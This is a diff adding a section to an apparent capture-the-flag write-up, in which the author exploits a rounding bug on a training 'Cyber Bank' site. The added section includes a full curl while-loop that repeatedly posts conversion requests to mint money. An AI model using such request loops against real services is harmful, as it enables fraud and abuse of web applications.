@@ -112,6 +112,16 @@ We are provided an access.log file to search information about the admin credent
     
 Flag for the challenge was 'wronghorsebatterystable'.
 
+#### Hack a Bank (Medium)
+
+In this challenge we were required to obtain more money from the Cyber Bank to be able to purchase the bank owners password. There was a conversion tool and rates available to convert euros to cyber money and back. After a while, I figured out that there was a bug in the conversion rate.
+
+	1 euro in cyber money - 0.03125
+	1 cyber money in euros - 32.0
+
+If we changed 100 euros to cyber money, the Cyber Bank would give us 3.13 in cyber cash, not 3.125 is it should. We could use this bug to create money out of thin air. I quickly set up a small while loop to do conversion between euros to cyber money and back to achieve the required 1200 euros for the password.
+
+	while true; do curl -i -s -k  -X $'POST'     -H $'Origin: https://cyber-bank.testmycode.io' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://cyber-bank.testmycode.io/convert'     -b $'_cyber-bank_session=SESSION_DATA'     --data-binary $'utf8=%E2%9C%93&authenticity_token=VEYAbYXroQH2%2Bs2Nc2WgHgZHHOFtqfsrf8CUzcVwtx7YMMLxMxs8LfDmSNCj5RR%2BS1qv1iKPe1qfSvRpqygFWQ%3D%3D&conversion=euros_to_cyber&amount%5B%5D=100&commit=Convert'     $'https://cyber-bank.testmycode.io/convert'; sleep 1; curl -i -s -k  -X $'POST'     -H $'Origin: https://cyber-bank.testmycode.io' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: https://cyber-bank.testmycode.io/convert'     -b $'_cyber-bank_session=SESSION_DATA'     --data-binary $'utf8=%E2%9C%93&authenticity_token=50FXreRg2ts3BPltUnSdhZ9laNdI6x97aMNItAmKP3lrN5UxUpBH9zEYfDCC9Cnl0njb4AfNnwqISSgQZ9KNPg%3D%3D&conversion=cyber_to_euros&amount%5B%5D=3.13&commit=Convert'     $'https://cyber-bank.testmycode.io/convert'; done
 
 #### Curious cat (Medium)
 
